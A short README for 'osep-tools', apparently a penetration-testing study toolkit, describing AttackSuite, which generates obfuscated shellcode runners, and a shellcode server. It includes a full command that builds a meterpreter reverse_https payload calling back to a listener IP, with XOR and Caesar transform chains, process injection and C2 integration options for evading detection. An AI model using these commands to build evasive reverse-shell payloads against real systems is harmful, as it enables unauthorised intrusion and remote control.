# osep-tools

## AttackSuite

Core Function, must accompany with `shellcode_server.py` now. Can integrate with other C2 framework such as Covenant.

```bash
python3 attackSuite.py -a win -b 64 -i 192.168.49.134 -p 80 -P 443 --payload meterpreter/reverse_https --chain xor-adwocdmwa-cae-11 --csc mcs -r 8888
```

```
usage: attackSuite.py [-h] [-a {win,nix}] [-b {32,64}] [-n {2,4}] -i IP -p PORT -P RPORT [-gP GPORT] [--payload PAYLOAD] [--inject INJECT] [--chome CHOME] [--mhome MHOME]
                      [--ps1 PS1] [--chain CHAIN] [--stageless] [--csc CSC] [--gcc GCC]

Python Shellcode Runner

optional arguments:
  -h, --help            show this help message and exit
  -a {win,nix}, --os {win,nix}
                        Choose OS
  -b {32,64}, --bits {32,64}
                        Choose process bits
  -n {2,4}, --netclr {2,4}
                        Choose .NET CLR version
  -i IP, --ip IP        HTTP Listener IP
  -p PORT, --port PORT  HTTP Listener Port
  -P RPORT, --rport RPORT
                        msf Listener Port
  --payload PAYLOAD     meterpreter payload used
  --inject INJECT       target process to inject
  --ps1 PS1             path to custom powershell script
  --chain CHAIN         payload transform expression, separated by "-" Ex. xor-ii1e12e1 => xor($buf, 'ii1e12e1') xor-eegg-cae-10 => cae(xor($buf, 'eegg'), 10)
  --stageless           create stageless payload (no interact with this http server)
```

## msf api server

Create various format of shellcode with non-trivial transformer (xor, base64, caesar).

```
python3 shellcode_server.py -H localhost
```



